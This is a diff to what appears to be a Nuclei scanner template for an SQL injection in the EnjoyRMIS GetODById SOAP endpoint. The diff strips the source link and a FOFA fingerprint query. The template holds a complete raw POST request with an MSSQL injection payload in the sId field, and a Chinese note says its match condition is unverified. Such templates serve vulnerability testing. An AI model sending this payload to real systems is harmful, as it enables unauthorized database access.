@@ -3,14 +3,8 @@ info:
   name: EnjoyRMISGetODById存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4c78bcea17d4d5855fdcf089396b5acf
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 4c78bcea17d4d5855fdcf089396b5acf
-    fofa: + hunter`web.body="CheckSilverlightInstalled"`
 http:
 - raw:
   - "POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetODById\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetODById xmlns=\"http://tempuri.org/\">\n      <sId>string' AND 8733 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8733=8733) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113))) AND 'atoN'='atoN</sId>\n\n    </GetODById>\n\n  </soap:Body>\n\n</soap:Envelope>"
